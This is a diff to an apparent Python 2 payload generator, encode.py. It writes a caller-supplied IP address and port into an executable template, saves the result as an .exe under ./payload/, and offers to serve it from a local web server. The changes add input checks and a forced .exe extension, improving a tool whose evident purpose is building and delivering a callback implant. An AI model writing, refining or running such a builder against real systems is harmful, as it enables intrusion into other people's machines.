@@ -3,11 +3,31 @@
 import sys, shutil, errno, os, BaseHTTPServer
 from SimpleHTTPServer import SimpleHTTPRequestHandler
 
-lhost_bytes = []
+try:
+	sys.argv[3]
+except IndexError as e:
+	print e
+	exit("Usage: encode.py <IP> <port> <output-file>")
+
+
 lhost = sys.argv[1]
-lhost_bytes = [chr(int(part)) for part in lhost.split(".")]
-port = int(sys.argv[2])
+
+try: lhost_bytes = [chr(int(part)) for part in lhost.split(".")]
+except ValueError: exit(lhost+" is not a correct IP address.")
+
+if len(lhost_bytes) != 4 or not all(0 <= ord(i) <= 255 for i in lhost_bytes):
+	print len(lhost_bytes)
+	print lhost_bytes
+	exit(lhost+" is not a correct IP address.")
+	
+try:
+	port = int(sys.argv[2])
+	if not 0 < port < 65535: raise ValueError
+except ValueError: exit(sys.argv[2]+" is not a valid port number.")
+
 output = sys.argv[3]
+
+if not output.endswith(".exe"): output += ".exe"
 
 try:
     os.makedirs('./payload/')
@@ -29,8 +49,7 @@ with open('./payload/'+output,"r+b") as f:
 		f.write(part)
 
 print "Payload generated, would you like to start a webserver there?"
-print "y/N"
-ans = raw_input()
+ans = raw_input("y/n ").lower()
 
 if ans == "y":
     os.chdir('./payload/')
